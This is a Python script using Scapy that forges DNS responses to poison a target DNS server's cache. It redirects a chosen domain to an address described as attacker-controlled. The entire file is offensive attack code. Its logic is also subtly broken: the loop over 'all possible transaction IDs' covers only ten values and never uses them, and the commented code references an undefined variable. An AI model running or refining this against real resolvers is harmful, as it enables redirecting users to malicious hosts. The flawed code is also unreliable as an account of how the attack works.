from scapy.all import *
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import UDP, IP

# Define the target DNS server and domain name to spoof
target_ip = "192.168.1.3"  # Replace with the target DNS server IP address
spoofed_domain = "web1.legit.com"  # Replace with the domain name to be spoofed

# Define a spoofed IP address for the malicious DNS response
spoofed_ip = "1.1.1.4"  # Replace with a valid IP address controlled by the attacker

# Construct the DNS query packet
query = IP(dst=target_ip) / UDP(sport=RandShort(), dport=53) / DNS(rd=1, qd=DNSQR(qname=spoofed_domain))

# Generate all possible transaction IDs
txids = range(0, 10)

# Loop through all possible transaction IDs
for txid in txids:
    # Set the transaction ID of the spoofed DNS response
    spoofed_response = IP(dst=target_ip) / \
                       UDP(sport=53, dport=53) / \
                       DNS(id=12345, qr=1, aa=1, qd=query[DNSQR], an=DNSRR(rrname=query[DNSQR].qname, rdata=spoofed_ip))

    # Send the spoofed DNS response
    send(spoofed_response, verbose=0)

# Send the spoofed DNS response
# query = IP(dst=target_ip) / UDP(sport=RandShort(), dport=53) / DNS(rd=1, qd=DNSQR(qname=spoofed_domain))
# response = sr1(packet, verbose=0)

# Print the DNS response
# print(response.summary())
